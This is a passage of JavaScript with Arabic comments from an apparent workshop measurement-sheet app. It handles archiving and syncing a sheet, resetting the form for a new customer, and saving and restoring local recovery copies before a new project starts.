      if(currentArchiveDocId) {
        /* fsUpdate لا fsSet: الكتابة الكاملة تستبدل المستند فتمحو الحقول
           التي لم نذكرها هنا — وهي createdAt وعلامات السلة (deleted /
           deletedAt / deletedBy). وكان ذلك يعني أن كراسةً حُذفت من جهاز
           وهي مفتوحة على جهاز آخر تعود من السلة وحدها مع أول حفظ تلقائي. */
        if (!checkSheetSize({ state: state })) return;   // لا نُرسل ما سيُرفض بصمت
        const _syncPatchNow = {
          label: name + " (" + formatWesternDate() + ")",
          state: state,
          updatedAt: Date.now(),
          updatedBy: (window.currentShopUser && window.currentShopUser.name) || ''
        };
        patchArchiveLocal(currentArchiveDocId, _syncPatchNow);
        wsQueueArchiveWrite(currentArchiveDocId,_syncPatchNow,false);window.WSArchiveOutbox?.flush();
      } else {
        createArchiveEntry();
      }

      // نحتفظ بمعرّف النسخة المحفوظة حتى يمكن استرجاعها بضغطة واحدة
      lastSavedSheet = { id: currentArchiveDocId, name: name, count: count };

      /* الخروج قبل أي تصفير: وضع keep يعني «أرشِف واترك كل شيء كما هو».
         كان التصفير يقع قبل هذا الشرط، فيمحو حالة الاعتماد التي ضبطها
         المستدعي للتو — ويعود الزر أحمر بعد ضغطة الاعتماد مباشرةً. */
      if (keepSheet) {
        showMiniToast('حُفظت الكراسة محلياً وبقيت البنود معروضة؛ جارٍ مزامنتها.','#04766b');
        resetIdleTimer();
        return true;
      }

      const _pe2 = document.getElementById('sheetPaid'); if (_pe2) _pe2.value = '';
      setSheetApproval(null);   // كراسة جديدة: الاعتماد يبدأ مفتوحاً
      sheetTotalOverride = null;   // كراسة جديدة: المجموع يعود للمحسوب
      resetAutoLocation();   // الكراسة التالية لزبون آخر — يُلتقط موقعه من جديد

      // التفريغ: نفصل الارتباط بالمستند أولاً، وإلا كتب الحفظ التلقائي كراسةً فارغة فوق النسخة المحفوظة للتو
      try { initCanvas(); } catch (e) {}
      const _mb2 = document.getElementById('mediaBox'); if (_mb2) _mb2.style.display = 'none';
      jobList = [];
      suppressedAutoBillTypes = new Set();
      editingIndex = -1;
      currentArchiveIndex = -1;
      setCurrentArchiveDoc(null);
      custLocation = null;
      custPhotos = [];
      renderProjectPhotos();
      document.getElementById('custName').value = '';
      document.getElementById('custPhone').value = '';
      document.getElementById('billArea').innerHTML = '';
      document.getElementById('editHint').style.display = 'none';
      clearInputs();
      clearExtraRepeats();
      document.querySelectorAll('#bulkGrid textarea[data-type]').forEach(ta => { ta.value = ''; });
      try { updateBulkPreview(); } catch(e) {}
      updateMainActionLabel();
      /* ══ فتح الكراسة الجديدة للكتابة — خارج شرط الصمت ══
         كان هذا السطر محبوساً داخل `if(!silent)`، فالمسارات الصامتة
         (اعتماد الخدمة، والأرشفة التلقائية بعد عشر دقائق) تُفرِّغ الكراسة
         وتتركها **مقفولة على وضع العرض**.

         والنتيجة التي تُبلَّغ عادةً هكذا: «لا أستطيع تعديل البنود المالية
         ولا حذف بند، والحفظ لا يحفظ». والسبب أن billArea يكون
         pointer-events: none — فالضغطات لا تصل الحقول أصلاً، ولا شيء
         يتغيّر ليُحفظ.

         التفريغ يعني دائماً كراسة جديدة فارغة، فلا معنى لإبقائها للقراءة
         فقط في أي مسار — صامت كان أو ظاهراً. */
      setSheetViewOnly(false);
      closeArchiveCustomersPanel();
      renderTable(); saveCurrentState();
      updateShareHeader();
      renderLocationButton();
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
      if(!silent) {
        showMiniToast('تم حفظ المقاسات في الأرشيف ✅ الكراسة الآن فارغة لزبون جديد', '#047480');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
      resetIdleTimer();
      return true;
    }

    // V361: استعادة نسخة مستقلة من الكراسات السابقة بعد التأكد من عدم إلغاء العمل الجاري.
    function wsOpenRecoveryList() {
      let keys=[];try{keys=JSON.parse(localStorage.getItem('ws_sheet_recovery_index')||'[]');}catch(e){}
      const entries=keys.map(key=>{try{const x=JSON.parse(localStorage.getItem(key)||'null');return x&&x.state?{key,...x}:null;}catch(e){return null;}}).filter(Boolean).reverse();
      if(!entries.length){alert('لا توجد كراسات احتياطية محفوظة بهذا الجهاز بعد التحديث. يمكنك فتح الكراسات السابقة من الأرشيف.');return;}
      const overlay=document.createElement('div');overlay.className='tp-overlay';
      const box=document.createElement('div');box.className='tp-box';box.style.maxWidth='440px';
      const title=document.createElement('h3');title.textContent='استرداد كراسة محفوظة محلياً';box.append(title);
      entries.forEach(entry=>{
        const btn=document.createElement('button');btn.type='button';btn.className='tp-btn';
        btn.style.cssText='display:block;width:100%;margin:8px 0;text-align:right;white-space:normal';
        btn.textContent=(entry.state.custName||'بدون اسم')+' — '+(entry.state.jobList||[]).length+' مقاسات — '+new Date(entry.savedAt).toLocaleString('ar-LY');
        btn.onclick=()=>{
          if(!confirm('سيتم فتح هذه النسخة في شاشة الإدخال. احفظ الكراسة الحالية قبل المتابعة. متابعة؟'))return;
          try{
            if(jobList.length)saveCurrentState();
            _loadingArchive=true;setCurrentArchiveDoc(null);currentArchiveIndex=-1;
            loadFromJSON(entry.state);
            _loadingArchive=false;setSheetViewOnly(false);renderTable();saveCurrentState();
            overlay.remove();showMiniToast('تم فتح النسخة الاحتياطية؛ راجع المقاسات قبل الحفظ','#047480');
          }catch(e){_loadingArchive=false;alert('تعذر الاسترداد: '+e.message);}
        };box.append(btn);
      });
      const cancel=document.createElement('button');cancel.className='tp-btn';cancel.textContent='إغلاق';cancel.onclick=()=>overlay.remove();box.append(cancel);
      overlay.append(box);document.body.append(overlay);
    }
    function startNewProject() {
      closeArchiveCustomersPanel();
      let hadData = jobList.length > 0;
      // Never erase the active sheet if a durable recovery copy cannot be written.
      if(hadData) {
        try {
          const previous=buildStateSnapshot();
          const key='ws_sheet_recovery_'+Date.now()+'_'+Math.random().toString(36).slice(2,9);
          const index=JSON.parse(localStorage.getItem('ws_sheet_recovery_index')||'[]');
          localStorage.setItem(key,JSON.stringify({savedAt:Date.now(),state:previous}));
          const check=JSON.parse(localStorage.getItem(key)||'null');
          if(!check||!check.state||!Array.isArray(check.state.jobList)||check.state.jobList.length!==jobList.length)throw new Error('RECOVERY_VERIFY_FAILED');
          index.push(key);
          localStorage.setItem('ws_sheet_recovery_index',JSON.stringify(index.slice(-100)));
        } catch(e) {
          alert('تعذر تأمين نسخة احتياطية للكراسة. لم تُمسح المقاسات. تحقق من مساحة التخزين وحاول مجدداً.');
          return false;
        }
        if(!currentArchiveDocId) {
          try { createArchiveEntry(); } catch(e) { console.warn('Archive enqueue failed; local recovery retained',e); }
        }
        try { window.WSArchiveOutbox?.flush(); } catch(e) {}
      }
      // بعد ضمان حفظ الكراسة السابقة، يبدأ رمز مستقل للكراسة الجديدة.
      rotateArchiveCreationOperationId();
      jobList = [];
      suppressedAutoBillTypes = new Set();
      editingIndex = -1;
      currentArchiveIndex = -1;
      setCurrentArchiveDoc(null);
      custLocation = null;
      custPhotos = [];
      renderProjectPhotos();
      clearExtraRepeats();
      updateMainActionLabel();
      document.getElementById('editHint').style.display = 'none';
      document.getElementById('custName').value = '';
      document.getElementById('custPhone').value = '';
      document.getElementById('billArea').innerHTML = '';
      const _pe = document.getElementById('sheetPaid'); if (_pe) _pe.value = '';
      setSheetApproval(null);   // كراسة جديدة: الاعتماد يبدأ مفتوحاً
      sheetTotalOverride = null;   // كراسة جديدة: المجموع يعود للمحسوب
      resetAutoLocation();   // زبون جديد → نلتقط موقعه هو
      setSheetViewOnly(false);   // كراسة فارغة جديدة → مفتوحة للكتابة (setSheetViewOnly تستدعي renderTable)
      saveCurrentState();
      updateShareHeader();
      renderLocationButton();
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
      if(hadData) alert('تم بدء ملف جديد، والعمل السابق محفوظ تلقائياً في الأرشيف ✅');
    }
  
